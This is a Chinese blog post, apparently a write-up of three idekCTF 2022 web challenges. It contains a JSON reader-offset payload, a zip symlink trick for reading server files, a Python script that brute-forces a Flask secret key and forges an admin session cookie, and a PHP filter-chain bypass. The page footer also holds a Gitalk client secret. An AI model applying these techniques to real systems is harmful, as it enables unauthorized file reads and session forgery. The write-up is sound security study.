@@ -1,0 +1,750 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>idekCTF2022 Web | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="idekCTF2022 Web | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="Readme
+给了源码，本地搭建把环境变量中flag和ip端口改了一下。源码如下：
+package main
+
+import (
+	&quot;bufio&quot;
+	&quot;bytes&quot;
+	&quot;context&qu..." />
+    <meta name="keywords" content="Zip,Flask" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              idekCTF2022 Web
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-01-17
+              </span>
+              <span>
+                16 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/zip/" class="post-tag">
+                  # Zip
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Ho5lh2d0I_/" class="post-tag">
+                  # Flask
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="readme">Readme</h1>
+<p>给了源码，本地搭建把环境变量中flag和ip端口改了一下。源码如下：</p>
+<pre><code class="language-go">package main
+
+import (
+	&quot;bufio&quot;
+	&quot;bytes&quot;
+	&quot;context&quot;
+	&quot;crypto/sha256&quot;
+	&quot;encoding/json&quot;
+	&quot;errors&quot;
+	&quot;fmt&quot;
+	&quot;io&quot;
+	&quot;io/ioutil&quot;
+	&quot;math/rand&quot;
+	&quot;net/http&quot;
+	&quot;time&quot;
+)
+
+var password = sha256.Sum256([]byte(&quot;idek&quot;))
+var randomData []byte
+
+const (
+	MaxOrders = 10
+)
+
+func initRandomData() {
+	rand.Seed(1337)
+	randomData = make([]byte, 24576)
+	if _, err := rand.Read(randomData); err != nil {
+		panic(err)
+	}
+	copy(randomData[12625:], password[:])
+}
+
+type ReadOrderReq struct {
+	Orders []int `json:&quot;orders&quot;`
+}
+
+func justReadIt(w http.ResponseWriter, r *http.Request) {
+	defer r.Body.Close()
+
+	body, err := ioutil.ReadAll(r.Body)
+	if err != nil {
+		w.WriteHeader(500)
+		w.Write([]byte(&quot;bad request\n&quot;))
+		return
+	}
+
+	reqData := ReadOrderReq{}
+	if err := json.Unmarshal(body, &amp;reqData); err != nil {
+		w.WriteHeader(500)
+		w.Write([]byte(&quot;invalid body\n&quot;))
+		return
+	}
+
+	if len(reqData.Orders) &gt; MaxOrders {
+		w.WriteHeader(500)
+		w.Write([]byte(&quot;whoa there, max 10 orders!\n&quot;))
+		return
+	}
+
+	reader := bytes.NewReader(randomData)
+	validator := NewValidator()
+
+	ctx := context.Background()
+	for _, o := range reqData.Orders {
+		if err := validator.CheckReadOrder(o); err != nil {
+			w.WriteHeader(500)
+			w.Write([]byte(fmt.Sprintf(&quot;error: %v\n&quot;, err)))
+			return
+		}
+
+		ctx = WithValidatorCtx(ctx, reader, int(o))
+		_, err := validator.Read(ctx)
+		if err != nil {
+			w.WriteHeader(500)
+			w.Write([]byte(fmt.Sprintf(&quot;failed to read: %v\n&quot;, err)))
+			return
+		}
+	}
+
+	if err := validator.Validate(ctx); err != nil {
+		w.WriteHeader(500)
+		w.Write([]byte(fmt.Sprintf(&quot;validation failed: %v\n&quot;, err)))
+		return
+	}
+
+	w.WriteHeader(200)
+	w.Write([]byte(&quot;flag{test_flag}&quot;))
+}
+
+func main() {
+
+	initRandomData()
+
+	http.HandleFunc(&quot;/just-read-it&quot;, justReadIt)
+
+	srv := http.Server{
+		Addr:         &quot;192.168.31.232:8989&quot;,
+		ReadTimeout:  5 * time.Second,
+		WriteTimeout: 5 * time.Second,
+	}
+
+	fmt.Printf(&quot;Server listening on %s\n&quot;, &quot;192.168.31.232:8989&quot;)
+	if err := srv.ListenAndServe(); err != nil {
+		panic(err)
+	}
+}
+
+type Validator struct{}
+
+func NewValidator() *Validator {
+	return &amp;Validator{}
+}
+
+func (v *Validator) CheckReadOrder(o int) error {
+	if o &lt;= 0 || o &gt; 100 {
+		return fmt.Errorf(&quot;invalid order %v&quot;, o)
+	}
+	return nil
+}
+
+func (v *Validator) Read(ctx context.Context) ([]byte, error) {
+	r, s := GetValidatorCtxData(ctx)
+	buf := make([]byte, s)
+	_, err := r.Read(buf)
+	if err != nil {
+		return nil, fmt.Errorf(&quot;read error: %v&quot;, err)
+	}
+	return buf, nil
+}
+
+func (v *Validator) Validate(ctx context.Context) error {
+	r, _ := GetValidatorCtxData(ctx)
+	buf, err := v.Read(WithValidatorCtx(ctx, r, 32))
+	if err != nil {
+		return err
+	}
+	fmt.Println(bytes.Index(randomData, buf))//这一句是我自己加的，方便调试
+	if bytes.Compare(buf, password[:]) != 0 {
+		return errors.New(&quot;invalid password&quot;)
+	}
+	return nil
+}
+
+const (
+	reqValReaderKey = &quot;readerKey&quot;
+	reqValSizeKey   = &quot;reqValSize&quot;
+)
+
+func GetValidatorCtxData(ctx context.Context) (io.Reader, int) {
+	reader := ctx.Value(reqValReaderKey).(io.Reader)
+	size := ctx.Value(reqValSizeKey).(int)
+	if size &gt;= 100 {
+		reader = bufio.NewReader(reader)
+	}
+	return reader, size
+}
+
+func WithValidatorCtx(ctx context.Context, r io.Reader, size int) context.Context {
+	ctx = context.WithValue(ctx, reqValReaderKey, r)
+	ctx = context.WithValue(ctx, reqValSizeKey, size)
+	return ctx
+}
+</code></pre>
+<p>首先初始化了两个全局变量：<code>password</code>和<code>randomData</code>。 <code>password</code>变量是由字符串&quot;idek&quot;进行SHA256哈希得到的。 <code>randomData</code>变量是创建了一个大小为<code>24576</code>字节的字节数组，然后使用<code>rand.Seed(1337)</code>随机填充该数组，最后在<code>randomData</code>的<code>12625</code>个字节后面添加上password变量的值。</p>
+<p>我们接下来看main函数</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/027fa835298c7.png" alt="1673682933342.png" loading="lazy"></figure>
+<p>这里设定了一个<code>just-read-it</code>路由，这个路由定义了诸多过滤，我们一个一个看。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/3f03ce9d7a28b.png" alt="1673683062705.png" loading="lazy"></figure>
+<p>第一行代码<code>defer r.Body.Close()</code>会在这个函数退出之前关闭请求的Body。 然后调用<code>ioutil.ReadAll(r.Body)</code>读取请求的body部分到一个字节数组里。 如果读取过程中出现错误，就会返回http状态码500和&quot;bad request&quot;的错误信息。</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/75bc95a264d9e.png" alt="1673683115420.png" loading="lazy"></figure>
+<p>这段代码中，它首先声明一个<code>ReadOrderReq</code>类型的变量<code>reqData</code>。然后使用<code>json.Unmarshal</code>函数将请求的<code>body</code>数据解码成<code>ReadOrderReq</code>类型的<code>reqData</code>。如果解码出现错误，则会返回<code>&quot;invalid body&quot;</code>的错误信息。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/69f19b64c613e.png" alt="1673683242956.png" loading="lazy"></figure>
+<p>这段代码就是限制<code>reqData</code>变量中<code>Orders</code>属性的数量不能大于10</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/eddbfc249f3de.png" alt="1673683432154.png" loading="lazy"></figure>
+<p>这里首先新建<code>bytes.Reader</code>对象并传入<code>randomData</code>数据。然后循环调用<code>validator.CheckReadOrder(o)</code>检测传入的每一个<code>Orders</code>，必须是大于1小于100的数</p>
+<h2 id="checkreadorder">CheckReadOrder</h2>
+<pre><code class="language-go">func (v *Validator) CheckReadOrder(o int) error {
+   if o &lt;= 0 || o &gt; 100 {
+      return fmt.Errorf(&quot;invalid order %v&quot;, o)
+   }
+   return nil
+}
+</code></pre>
+<h2 id="withvalidatorctx">WithValidatorCtx</h2>
+<p>然后调用<code>WithValidatorCtx</code>函数，</p>
+<pre><code class="language-go">func WithValidatorCtx(ctx context.Context, r io.Reader, size int) context.Context {
+   ctx = context.WithValue(ctx, reqValReaderKey, r)
+   ctx = context.WithValue(ctx, reqValSizeKey, size)
+   return ctx
+}
+</code></pre>
+<p>这段代码是定义了一个函数WithValidatorCtx，它用于在给定的上下文中添加两个键值对，分别是reqValReaderKey和reqValSizeKey，并将它们的值分别设置为传入的<code>reader</code>和<code>orders</code>。最后将新的上下文返回。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/0175dcc6fdf23.png" alt="1673684307285.png" loading="lazy"></figure>
+<p>随后调用Read方法。</p>
+<h2 id="read">Read</h2>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/8a552f6793fe8.png" alt="1673684345236.png" loading="lazy"></figure>
+<p>这段代码是一个实现了 <code>Validator</code> 结构体的 Read 方法，它接受一个 <code>context.Context</code> 类型的参数 ctx，调用 <code>GetValidatorCtxData(ctx) </code>方法获取到 <code>reader</code> 和 <code>orders</code>的值，分别赋值给变量 r 和 s。接着定义一个 buf 变量，大小为 s，然后调用 <code>r.Read(buf)</code> 方法读取数据。每调用一次Read，位置就会往后移。</p>
+<p>接下来调用<code>Validate(ctx)</code></p>
+<h2 id="validate">Validate</h2>
+<pre><code class="language-go">func (v *Validator) Validate(ctx context.Context) error {
+   r, _ := GetValidatorCtxData(ctx)
+   buf, err := v.Read(WithValidatorCtx(ctx, r, 32))
+   if err != nil {
+      return err
+   }
+   fmt.Println(bytes.Index(randomData, buf))
+   if bytes.Compare(buf, password[:]) != 0 {
+      return errors.New(&quot;invalid password&quot;)
+   }
+   return nil
+}
+</code></pre>
+<p>这里传入上下文，获取到reader，然后读取32位数据。然后将读取到的数据与密码做对比，如果正确则通过if，最后拿到flag。</p>
+<p>我们知道randomData[12625:]之后的数据衔接密码，所以我们要让读取的位置从12625开始，即可让reader.Read()读取到的数据是以密码</p>
+<p>先输入100，得到位置是4096，输入其他数字，得到的则是本身</p>
+<p>那么 4096x3 + 98x3+43=12625</p>
+<p>所以post传入：</p>
+<pre><code class="language-json">{&quot;orders&quot;: [100, 100, 100, 98,98,98,43]}
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/2d7e0d07f0705.png" alt="1673686270334.png" loading="lazy"></figure>
+<h1 id="simplefileserver">SimpleFileServer</h1>
+<h2 id="分析源码">分析源码</h2>
+<p>给了源码，是flask框架，获取flag需要伪造admin</p>
+<pre><code class="language-python">import logging
+import os
+import re
+import sqlite3
+import subprocess
+import uuid
+import zipfile
+
+from flask import (Flask, flash, redirect, render_template, request, abort,
+                   send_from_directory, session)
+from werkzeug.security import check_password_hash, generate_password_hash
+
+
+app = Flask(__name__)
+DATA_DIR = &quot;/tmp/&quot;
+
+# Uploads can only be 2MB in size
+app.config['MAX_CONTENT_LENGTH'] = 2 * 1000 * 1000
+
+# Configure logging
+LOG_HANDLER = logging.FileHandler(DATA_DIR + 'server.log')
+LOG_HANDLER.setFormatter(logging.Formatter(fmt=&quot;[{levelname}] [{asctime}] {message}&quot;, style='{'))
+logger = logging.getLogger(&quot;application&quot;)
+logger.addHandler(LOG_HANDLER)
+logger.propagate = False
+for handler in logging.root.handlers[:]:
+    logging.root.removeHandler(handler)
+logging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')
+logging.getLogger().addHandler(logging.StreamHandler())
+
+# Set secret key
+app.config[&quot;SECRET_KEY&quot;] = os.environ[&quot;SECRET_KEY&quot;]
+
+@app.route(&quot;/&quot;)
+def index():
+    return render_template(&quot;index.html&quot;)
+
+
+@app.route(&quot;/login&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def login():
+    session.clear()
+
+    if request.method == &quot;GET&quot;:
+        return render_template(&quot;login.html&quot;)
+
+    username = request.form.get(&quot;username&quot;, &quot;&quot;)
+    password = request.form.get(&quot;password&quot;, &quot;&quot;)
+    with sqlite3.connect(DATA_DIR + &quot;database.db&quot;) as db:
+        res = db.cursor().execute(&quot;SELECT password, admin FROM users WHERE username=?&quot;, (username,))
+        user = res.fetchone()
+        if not user or not check_password_hash(user[0], password):
+            flash(&quot;Incorrect username/password&quot;, &quot;danger&quot;)
+            return render_template(&quot;login.html&quot;)
+    
+    session[&quot;uid&quot;] = username
+    session[&quot;admin&quot;] = user[1]
+    return redirect(&quot;/upload&quot;)
+
+
+@app.route(&quot;/register&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def register():
+    session.clear()
+
+    if request.method == &quot;GET&quot;:
+        return render_template(&quot;register.html&quot;)
+
+    username = request.form.get(&quot;username&quot;, &quot;&quot;)
+    password = request.form.get(&quot;password&quot;, &quot;&quot;)
+    if not username or not password or not re.fullmatch(&quot;[a-zA-Z0-9_]{1,24}&quot;, username):
+        flash(&quot;Invalid username/password&quot;, &quot;danger&quot;)
+        return render_template(&quot;register.html&quot;)
+    
+    with sqlite3.connect(DATA_DIR + &quot;database.db&quot;) as db:
+        res = db.cursor().execute(&quot;SELECT username FROM users WHERE username=?&quot;, (username,))
+        if res.fetchone():
+            flash(&quot;That username is already registered&quot;, &quot;danger&quot;)
+            return render_template(&quot;register.html&quot;)
+        
+        db.cursor().execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, generate_password_hash(password)))
+        db.commit()
+    
+    session[&quot;uid&quot;] = username
+    session[&quot;admin&quot;] = False
+    return redirect(&quot;/upload&quot;)
+
+
+@app.route(&quot;/upload&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def upload():
+    if not session.get(&quot;uid&quot;):
+        return redirect(&quot;/login&quot;)
+    if request.method == &quot;GET&quot;:
+        return render_template(&quot;upload.html&quot;)
+
+    if &quot;file&quot; not in request.files:
+        flash(&quot;You didn't upload a file!&quot;, &quot;danger&quot;)
+        return render_template(&quot;upload.html&quot;)
+    
+    file = request.files[&quot;file&quot;]
+    uuidpath = str(uuid.uuid4())
+    filename = f&quot;{DATA_DIR}uploadraw/{uuidpath}.zip&quot;
+    file.save(filename)
+    subprocess.call([&quot;unzip&quot;, filename, &quot;-d&quot;, f&quot;{DATA_DIR}uploads/{uuidpath}&quot;])    
+    flash(f'Your unique ID is &lt;a href=&quot;/uploads/{uuidpath}&quot;&gt;{uuidpath}&lt;/a&gt;!', &quot;success&quot;)
+    logger.info(f&quot;User {session.get('uid')} uploaded file {uuidpath}&quot;)
+    return redirect(&quot;/upload&quot;)
+
+
+@app.route(&quot;/uploads/&lt;path:path&gt;&quot;)
+def uploads(path):
+    try:
+        return send_from_directory(DATA_DIR + &quot;uploads&quot;, path)
+    except PermissionError:
+        abort(404)
+
+
+@app.route(&quot;/flag&quot;)
+def flag():
+    if not session.get(&quot;admin&quot;):
+        return &quot;Unauthorized!&quot;
+    return subprocess.run(&quot;./flag&quot;, shell=True, stdout=subprocess.PIPE).stdout.decode(&quot;utf-8&quot;)
+</code></pre>
+<p>在config.py中发现SECRET_KEY是通过随机数生成的，种子是时间戳+一个常数。但这个常数是被修改过的，并没有给我们</p>
+<pre><code class="language-python">SECRET_OFFSET = 0 # REDACTED
+random.seed(round((time.time() + SECRET_OFFSET) * 1000))
+os.environ[&quot;SECRET_KEY&quot;] = &quot;&quot;.join([hex(random.randint(0, 15)) for x in range(32)]).replace(&quot;0x&quot;, &quot;&quot;)
+</code></pre>
+<p>此时我们就应该寻找这个时间了，从dockerfile中可以看到有<code>/tmp/server.log</code>日志</p>
+<pre><code class="language-dockerfile">FROM gcr.io/kctf-docker/challenge@sha256:d884e54146b71baf91603d5b73e563eaffc5a42d494b1e32341a5f76363060fb
+
+RUN apt update &amp;&amp; apt install -y \
+        sqlite3 zip unzip \
+    &amp;&amp; rm -rf /var/lib/apt/lists/*
+
+# pip
+RUN pip install --no-cache-dir flask gunicorn
+
+COPY src/ /app
+WORKDIR /app
+
+RUN chmod 4755 flag
+RUN chmod 600 flag.txt
+
+USER nobody
+
+CMD bash -c &quot;mkdir /tmp/uploadraw /tmp/uploads &amp;&amp; sqlite3 /tmp/database.db \&quot;CREATE TABLE users(username text, password text, admin boolean)\&quot; &amp;&amp; /usr/local/bin/gunicorn --bind 0.0.0.0:1337 --config config.py --log-file /tmp/server.log wsgi:app&quot;
+</code></pre>
+<p>日志当中肯定记录了服务器运行这个程序的时间，取这个时间的前后进行爆破应该就可以了。这题可以上传zip，然后服务器进行解压缩，并把解压之后的文件链接给你。我们可以通过<code>zip软链接</code>实现读取除flag以外的任意文件，因为这题的flag是600权限</p>
+<h2 id="软链接读取">软链接读取</h2>
+<pre><code class="language-shell">ln -s /tmp/server.log le1a.link
+zip --symlink le1a.zip le1a.link
+</code></pre>
+<p>读取到时间以后，转为时间戳开始爆破正确的时间戳。然后我们还要读取<code>config.py</code>中真正的<code>SECRET_OFFSET</code></p>
+<p>这里我们可以用到<code>flask_unsign</code>包来验证key是否正确</p>
+<pre><code class="language-python">import random
+import sys
+from flask_unsign import verify, sign
+
+session = &quot;eyJhZG1pbiI6bnVsbCwidWlkIjoiYSJ9.Y8NJdQ.t-Orpm8NJN1OcTRqzI1SJsx_hks&quot;
+
+# 验证key是否正确
+#print(verify(&quot;eyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU&quot;, &quot;CHANGEME&quot;))
+
+
+# 时间戳范围
+start = 1673737312
+#       1673737412
+end =   1673737415
+SECRET_OFFSET = -67198624
+
+
+while start &lt; end:
+    start = round(start,3)
+    random.seed(round((start + SECRET_OFFSET) * 1000))
+    key = &quot;&quot;.join([hex(random.randint(0, 15)) for x in range(32)]).replace(&quot;0x&quot;, &quot;&quot;)
+    print(start)
+
+    if verify(session, key) == True:
+        #key = &quot;e897071bf3d5dc6ff7882fc0b64ece5c&quot;
+        print(&quot;===&quot;*20)
+        print(sign({'admin':True, 'uid': 'a'}, key))
+        print(key)
+        sys.exit(0)
+
+    start += 0.001
+</code></pre>
+<p>将得到的session替换，然后访问flag路由即可获得flag。</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/17/3cd2ec151a917.png" alt="1673950867874.png" loading="lazy"></figure>
+<h1 id="paywall">Paywall</h1>
+<p>给了源码</p>
+<pre><code class="language-PHP">&lt;?php if (isset($_GET['source'])) highlight_file(__FILE__) &amp;&amp; die() ?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;assets/style.css&quot;&gt;
+    &lt;title&gt;The idek Times&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;main&gt;
+    &lt;nav&gt;
+        &lt;h1&gt;The idek Times&lt;/h1&gt;
+    &lt;/nav&gt;
+
+    &lt;?php
+
+        error_reporting(0);
+        set_include_path('articles/');
+
+        if (isset($_GET['p'])) {
+            $article_content = file_get_contents($_GET['p'], 1);
+
+            if (strpos($article_content, 'PREMIUM') === 0) {
+                die('Thank you for your interest in The idek Times, but this article is only for premium users!'); // TODO: implement subscriptions
+            }
+            else if (strpos($article_content, 'FREE') === 0) {
+                echo &quot;&lt;article&gt;$article_content&lt;/article&gt;&quot;;
+                die();
+            }
+            else {
+                die('nothing here');
+            }
+        }
+           
+    ?&gt;
+
+    &lt;a href=&quot;/?p=flag&quot;&gt;
+        &lt;article&gt;
+            &lt;h2&gt;All about flags&lt;/h2&gt;
+            &lt;p&gt;Click to view&lt;/p&gt;
+        &lt;/article&gt;
+    &lt;/a&gt;
+    
+    &lt;a href=&quot;/?p=hello-world&quot;&gt;
+        &lt;article&gt;
+            &lt;h2&gt;My first post!&lt;/h2&gt;
+            &lt;p&gt;Click to view&lt;/p&gt;
+        &lt;/article&gt;
+    &lt;/a&gt;
+
+    &lt;a href=&quot;/?source&quot; id=&quot;source&quot;&gt;Source&lt;/a&gt;
+    
+&lt;/main&gt;
+
+    
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>这里请求p参数，然后使用<code>file_get_contents()</code>函数读取这个文件。但是会检测文件内容，如果是以<code>PREMIUM</code>开头的话，就会被拦截。如果是以<code>FREE</code>开头，就会把文件内容展示出来。</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/18/e9666f2a9a48c.png" alt="1674026278606.png" loading="lazy"></figure>
+<p>我们来看一下flag的格式，正是以<code>PREMIUM</code>开头的，所以说直接<code>?p=flag</code>是会被拦截的</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/18/d90a83c90d2e8.png" alt="1674027626516.png" loading="lazy"></figure>
+<p>所以这里想要<code>bypass</code>这个过滤，就得让<code>flag</code>以<code>FREE</code>开头。一般来说常用<code>filter</code>伪协议来加密文件内容,例如<code>String.rot13</code>之类的。</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/18/3335e26c2e479.png" alt="1674028916628.png" loading="lazy"></figure>
+<p>那要怎样才能改变读取到的文件内容，使得文件内容以FREE开头呢。</p>
+<h2 id="filter链">filter链</h2>
+<p>这里有一个开源工具  https://github.com/synacktiv/php_filter_chain_generator</p>
+<pre><code class="language-shell">python3 php_filter_chain_generator.py --chain 'FREE  '  //至于这里为什么FREE后面要加空格下面再说
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/18/fd84162402573.png" alt="1674029336146.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/18/e9e0fa35f0fe5.png" alt="1674029391041.png" loading="lazy"></figure>
+<h2 id="flag">flag</h2>
+<pre><code>idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}
+</code></pre>
+<h2 id="free后为什么要加空格">FREE后为什么要加空格</h2>
+<p>我们来看看不加空格的效果：</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/18/ded033165015b.png" alt="1674029554401.png" loading="lazy"></figure>
+<p>可以看到虽然flag读取到了，flag乱码了。原因可能是因为要把构造的FREE 跟 flag间隔开，防止flag部分也被加密输出了。</p>
+<p>在工具文档也说了，需要在FREE之后填充几个空格，以便payload可以正常工作</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/18/8a5f4031941ac.png" alt="1674029969324.png" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#readme">Readme</a>
+<ul>
+<li><a href="#checkreadorder">CheckReadOrder</a></li>
+<li><a href="#withvalidatorctx">WithValidatorCtx</a></li>
+<li><a href="#read">Read</a></li>
+<li><a href="#validate">Validate</a></li>
+</ul>
+</li>
+<li><a href="#simplefileserver">SimpleFileServer</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81">分析源码</a></li>
+<li><a href="#%E8%BD%AF%E9%93%BE%E6%8E%A5%E8%AF%BB%E5%8F%96">软链接读取</a></li>
+</ul>
+</li>
+<li><a href="#paywall">Paywall</a>
+<ul>
+<li><a href="#filter%E9%93%BE">filter链</a></li>
+<li><a href="#flag">flag</a></li>
+<li><a href="#free%E5%90%8E%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8A%A0%E7%A9%BA%E6%A0%BC">FREE后为什么要加空格</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/snakeYaml/">
+              <h3 class="post-title">
+                初探snakeYaml反序列化
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
